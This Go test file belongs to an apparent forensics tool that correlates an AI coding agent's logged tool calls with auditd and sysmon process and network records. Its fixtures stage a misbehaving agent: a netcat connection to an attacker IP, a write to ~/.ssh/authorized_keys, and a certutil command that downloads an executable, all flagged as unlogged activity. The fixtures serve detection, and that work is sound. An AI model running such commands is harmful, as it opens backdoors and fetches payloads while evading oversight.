package correlate

import (
	"strings"
	"testing"
	"time"

	"github.com/efij/AgentDFIR/internal/endpoint"
	"github.com/efij/AgentDFIR/internal/schema"
)

func ts(s string) time.Time { t, _ := time.Parse(time.RFC3339, s); return t }

func tc(id, when, tool, cmd string) schema.Event {
	return schema.Event{EventID: id, EventType: schema.EventToolCall, Tool: tool, Command: cmd, Timestamp: when,
		Corroboration: schema.StateObserved, SessionID: "s1", AgentID: "main:s1", SourcePath: "p.jsonl", SourceLine: 1}
}

func TestEndpointCorrelation(t *testing.T) {
	events := []schema.Event{
		tc("e1", "2026-08-30T10:00:07Z", "Bash", "rm -rf build"),                             // exact via shell wrapper → CORROBORATED
		tc("e2", "2026-08-30T10:00:20Z", "Bash", "pytest -q"),                                // inside coverage, no process → CONTRADICTED
		tc("e3", "2026-08-30T12:00:00Z", "Bash", "make deploy"),                              // outside coverage → unchanged
		tc("e4", "2026-08-30T10:00:30Z", "Bash", "git add . && git commit -m x && git push"), // compound: matches `git push` segment
		{EventID: "e5", EventType: schema.EventToolCall, Tool: "Write", File: "/home/dev/.ssh/authorized_keys", Timestamp: "2026-08-30T10:00:12Z", Corroboration: schema.StateObserved},
		{EventID: "e6", EventType: schema.EventToolCall, Tool: "Bash", Command: "curl https://api.github.com/repos", NetworkDest: "api.github.com", Timestamp: "2026-08-30T10:00:40Z", Corroboration: schema.StateObserved},
		{EventID: "e7", EventType: schema.EventModelResponse, Summary: "done", Timestamp: "2026-08-30T10:00:41Z", Corroboration: schema.StateReported},
	}
	recs := []endpoint.Record{
		// agent root process: node running the claude CLI
		{Time: ts("2026-08-30T09:59:00Z"), Kind: "process", PID: 4400, PPID: 1, Exe: "/usr/local/bin/node", Cmdline: "node /usr/local/lib/node_modules/@anthropic-ai/claude-code/cli.js", Source: "auditd", Ref: "audit.log:1"},
		{Time: ts("2026-08-30T10:00:07Z"), Kind: "process", PID: 4411, PPID: 4400, Exe: "/bin/zsh", Cmdline: "/bin/zsh -c rm -rf build", Source: "auditd", Ref: "audit.log:2"},
		{Time: ts("2026-08-30T10:00:12Z"), Kind: "file", PID: 4411, PPID: 4400, Exe: "/usr/bin/python3", FilePath: "/home/dev/.ssh/authorized_keys", FileOp: "create", Source: "auditd", Ref: "audit.log:3"},
		{Time: ts("2026-08-30T10:00:31Z"), Kind: "process", PID: 4420, PPID: 4400, Exe: "/usr/bin/git", Cmdline: "git push", Source: "auditd", Ref: "audit.log:4"},
		// unlogged: agent child runs nc to attacker, twice
		{Time: ts("2026-08-30T10:00:35Z"), Kind: "process", PID: 4430, PPID: 4411, Exe: "/usr/bin/nc", Cmdline: "nc 185.10.10.10 4444", Source: "auditd", Ref: "audit.log:5"},
		{Time: ts("2026-08-30T10:00:36Z"), Kind: "process", PID: 4431, PPID: 4411, Exe: "/usr/bin/nc", Cmdline: "nc 185.10.10.10 4445", Source: "auditd", Ref: "audit.log:6"},
		{Time: ts("2026-08-30T10:00:36Z"), Kind: "network", PID: 4430, PPID: 4411, Exe: "/usr/bin/nc", DestIP: "185.10.10.10", DestPort: 4444, Source: "auditd", Ref: "audit.log:7"},
		// allowlisted network by agent → ignored; matched network for e6
		{Time: ts("2026-08-30T10:00:40Z"), Kind: "network", PID: 4440, PPID: 4400, Exe: "/usr/bin/curl", DestHost: "api.github.com", DestPort: 443, Source: "auditd", Ref: "audit.log:8"},
		{Time: ts("2026-08-30T10:00:50Z"), Kind: "network", PID: 4400, PPID: 1, Exe: "/usr/local/bin/node", DestHost: "api.anthropic.com", DestPort: 443, Source: "auditd", Ref: "audit.log:9"},
		// noise helper spawned by agent → not reported
		{Time: ts("2026-08-30T10:00:51Z"), Kind: "process", PID: 4450, PPID: 4400, Exe: "/usr/bin/uname", Cmdline: "uname -a", Source: "auditd", Ref: "audit.log:10"},
		// unrelated process (not agent lineage) → ignored entirely
		{Time: ts("2026-08-30T10:00:52Z"), Kind: "process", PID: 9000, PPID: 1, Exe: "/usr/bin/cron", Cmdline: "cron -f", Source: "auditd", Ref: "audit.log:11"},
	}
	res, findings := Endpoint(events, recs, EndpointOptions{})
	if res.ToolCalls != 6 || res.Corroborated != 4 || res.Contradicted != 1 || res.OutsideCover != 1 {
		t.Fatalf("summary: %+v", res)
	}
	states := map[string]string{}
	for _, e := range events {
		states[e.EventID] = e.Corroboration
	}
	want := map[string]string{"e1": schema.StateCorroborated, "e2": schema.StateContradicted, "e3": schema.StateObserved,
		"e4": schema.StateCorroborated, "e5": schema.StateCorroborated, "e6": schema.StateCorroborated, "e7": schema.StateReported}
	for id, w := range want {
		if states[id] != w {
			t.Errorf("%s: got %s want %s", id, states[id], w)
		}
	}
	if !strings.Contains(events[0].Summary, "corroborated by auditd process (audit.log:2)") {
		t.Fatalf("evidence note missing: %q", events[0].Summary)
	}
	by := map[string][]schema.Finding{}
	for _, f := range findings {
		by[f.RuleID] = append(by[f.RuleID], f)
	}
	if n := len(by["ENDPOINT_CONTRADICTED_COMMAND"]); n != 1 || !strings.Contains(by["ENDPOINT_CONTRADICTED_COMMAND"][0].Description, "pytest") {
		t.Fatalf("contradicted: %+v", by["ENDPOINT_CONTRADICTED_COMMAND"])
	}
	// nc grouped into one finding with count 2; cron and uname not reported.
	if n := len(by["UNLOGGED_AGENT_ACTIVITY"]); n != 1 || !strings.Contains(by["UNLOGGED_AGENT_ACTIVITY"][0].Description, "2 execution(s) of \"nc\"") {
		t.Fatalf("unlogged activity: %+v", by["UNLOGGED_AGENT_ACTIVITY"])
	}
	if n := len(by["UNLOGGED_AGENT_NETWORK"]); n != 1 || !strings.Contains(by["UNLOGGED_AGENT_NETWORK"][0].Description, "185.10.10.10:4444") {
		t.Fatalf("unlogged network: %+v", by["UNLOGGED_AGENT_NETWORK"])
	}
	if res.AgentProcesses < 8 {
		t.Fatalf("lineage too small: %d", res.AgentProcesses)
	}
}

func TestEndpointNoProcessTelemetryNeverContradicts(t *testing.T) {
	// Only network records available: a command with no match must stay OBSERVED.
	events := []schema.Event{tc("e1", "2026-08-30T10:00:07Z", "Bash", "ls -la")}
	recs := []endpoint.Record{{Time: ts("2026-08-30T10:00:00Z"), Kind: "network", PID: 1, Exe: "/usr/bin/curl", DestIP: "1.2.3.4", Source: "x", Ref: "x:1"},
		{Time: ts("2026-08-30T10:01:00Z"), Kind: "network", PID: 1, Exe: "/usr/bin/curl", DestIP: "1.2.3.4", Source: "x", Ref: "x:2"}}
	res, f := Endpoint(events, recs, EndpointOptions{})
	if res.Contradicted != 0 || len(f) != 0 || events[0].Corroboration != schema.StateObserved {
		t.Fatalf("must not contradict without process telemetry: %+v %+v", res, f)
	}
}

func TestEndpointWindowsLineageViaParentImage(t *testing.T) {
	events := []schema.Event{tc("e1", "2026-08-30T10:00:07Z", "Bash", "rmdir /s /q build")}
	recs := []endpoint.Record{
		{Time: ts("2026-08-30T10:00:07Z"), Kind: "process", PID: 4411, PPID: 4400, Exe: `C:\Windows\System32\cmd.exe`, Cmdline: `cmd.exe /c rmdir /s /q build`, ParentExe: `C:\Users\dev\AppData\Local\Programs\cursor\Cursor.exe`, Source: "sysmon", Ref: "sysmon:1"},
		{Time: ts("2026-08-30T10:00:09Z"), Kind: "process", PID: 4412, PPID: 4400, Exe: `C:\Windows\System32\certutil.exe`, Cmdline: `certutil -urlcache -f http://x/a.exe a.exe`, ParentExe: `C:\Users\dev\AppData\Local\Programs\cursor\Cursor.exe`, Source: "sysmon", Ref: "sysmon:2"},
	}
	res, f := Endpoint(events, recs, EndpointOptions{})
	if res.Corroborated != 1 || events[0].Corroboration != schema.StateCorroborated {
		t.Fatalf("cmd wrapper not matched: %+v", res)
	}
	if len(f) != 1 || f[0].RuleID != "UNLOGGED_AGENT_ACTIVITY" || !strings.Contains(f[0].Description, "certutil.exe") {
		t.Fatalf("certutil should be unlogged agent activity: %+v", f)
	}
}
